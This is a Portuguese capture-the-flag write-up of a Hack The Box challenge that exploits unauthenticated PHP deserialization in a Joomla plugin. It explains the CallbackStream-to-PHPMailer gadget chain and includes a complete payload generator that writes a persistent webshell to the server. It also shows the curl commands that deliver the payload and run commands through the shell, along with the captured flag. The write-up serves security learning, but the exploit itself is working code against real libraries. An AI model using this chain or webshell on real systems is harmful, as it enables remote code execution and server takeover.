

# Provide
## Resolvido por Cesar B
### URL da maquina ||[Link](http://127.0.0.1)||

```elixir
POST não autenticado
→ O plugin processa a requisição no evento onAfterRoute antes de o Joomla bloquear o usuário com a tela de login.

parâmetro ledger
→ É o campo controlado pelo atacante e o nome esperado pelo código vulnerável.

getRaw('ledger')
→ Lê o conteúdo bruto do parâmetro ledger, preservando o payload serializado sem filtragem.

unserialize($ledger)
→ Reconstrói dados e objetos PHP enviados pelo atacante, causando a PHP Object Injection.

objeto CallbackStream criado
→ É colocado no campo month porque essa classe possui __toString() e permite executar um callback quando convertida em texto.

objeto PHPMailer criado
→ É armazenado dentro do callback do CallbackStream e configurado para usar um comando controlado como binário sendmail.

normalizeMonthlyGoods()
→ A aplicação percorre normalmente os dados desserializados e processa o registro enviado pelo atacante.

(string) $entry['month']
→ Como month contém um CallbackStream, o cast para string dispara automaticamente seu método __toString().

CallbackStream::__toString()
→ Executa o callback armazenado dentro do objeto.

callback PHPMailer::send()
→ O callback aponta para o método send() do objeto PHPMailer, então esse método é chamado.

PHPMailer executa Sendmail controlado
→ Como o transporte é sendmail e a propriedade Sendmail foi manipulada, o PHPMailer inicia o comando definido pelo atacante.

 /bin/sh -c /readflag
→ O shell executa o binário /readflag no servidor.

HTB{...}
→ O binário /readflag possui permissão para ler a flag protegida e imprime seu conteúdo.
```

```elixir
  - Tipo: PHP Object Injection / desserialização insegura
  - Classificação: CWE-502 — Deserialization of Untrusted Data
  - Código vulnerável:

  $data = @unserialize($ledger);

  - Endpoint vulnerável:

  /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import

  O parâmetro ledger chega ao unserialize() antes da autenticação. Agora precisamos encontrar uma gadget chain presente no Joomla 6.1.2 para executar /readflag.


• Essa falha permite PHP Object Injection sem autenticação. Com uma gadget chain compatível, ela pode dar:

  - Execução remota de comandos como usuário www-data.
  - Leitura da senha aleatória do administrador em /tmp/joomla-admin-password.
  - Alteração de arquivos acessíveis pelo servidor web.
  - Execução do binário SUID /readflag, que lê /root/flag.txt.

  Para o CTF, o caminho mais direto é:

  unserialize() → gadget chain → executar /readflag → obter HTB{...}

 a falha potencialmente nos leva direto à flag. Ainda estou validando a gadget chain exata do Joomla 6.1.2.


  challenge/plugin/src/Workflow/GatehouseRepository.php

  Função vulnerável:

  public function importMonthlyLedger(string $ledger): array
  {
      if (trim($ledger) === '') {
          return $this->result('rejected', 'FAILED', 'Update could not be processed.');
      }

      $data = @unserialize($ledger); // VULNERABILIDADE

      if (!is_array($data)) {
          return $this->result('rejected', 'FAILED', 'Update could not be processed.');
      }

      return $this->importMonthlyRecords($data);
  }

  O parâmetro chega até ela por:

  challenge/plugin/src/Extension/Gatehouse.php

  Neste trecho:

  $ledger = $app->getInput()->getRaw('ledger', '');
  (new GatehouseRepository())->importMonthlyLedger($ledger);

  A rota exigida é:

  /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import

```



```elixir
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Provisoes]
└─$ php generate_webshell_payload.php '/var/www/html/.gate.php' | curl -sS --max-time 15 -o /tmp/provisoes-post.out -w '%{http_code}\n' -X POST  'http://154.57.164.61:31110/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import' --data-urlencode 'ledger@-'            
200
                                                                                                                                                             
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Provisoes]
└─$ curl -sS --max-time 15 --get \
  'http://154.57.164.61:31110/.gate.php' \
  --data-urlencode 'cmd=/readflag'
Date: Fri, 24 Jul 2026 14:45:10 +0000
To: archive@example.test
From: Provision Office <provision@example.test>
Subject: Ledger
Message-ID: <vtCnc004rjK67FH2KonB1wUFe5dmyGJKzavaNwtQzo@154.57.164.61>
X-Mailer: PHPMailer 6.12.0 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1

<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/.gate.php:1) in <b>/var/www/html/.gate.php</b> on line <b>11</b><br />
HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_0887f4c37f69a5de47ad60a76244871f}                                                                                                                                                             
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Provisoes]
└─$ cat generate_webshell_payload.php
<?php

declare(strict_types=1);

define('_JEXEC', 1);
require '/tmp/joomla-6.1.2-src/libraries/vendor/autoload.php';

use Laminas\Diactoros\CallbackStream;
use PHPMailer\PHPMailer\PHPMailer;

$remotePath = $argv[1] ?? '/var/www/html/.gate.php';

$mailer = new PHPMailer();
$mailer->isSendmail();
$mailer->Sendmail = '/bin/sh -c "/usr/bin/tee ' . $remotePath . '"';
$mailer->setFrom('provision@example.test', 'Provision Office');
$mailer->addAddress('archive@example.test');
$mailer->Subject = 'Ledger';
$mailer->Encoding = '8bit';
$mailer->Body = <<<'PHP'
<?php
header('Content-Type: text/plain');
passthru($_GET['cmd'] ?? '/readflag');
?>
PHP;

$stream = new CallbackStream([$mailer, 'send']);

echo serialize([
    [
        'month' => $stream,
        'packages' => 1,
    ],
]);
```

Flag 

```elixir
HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_0887f4c37f69a5de47ad60a76244871f}
```
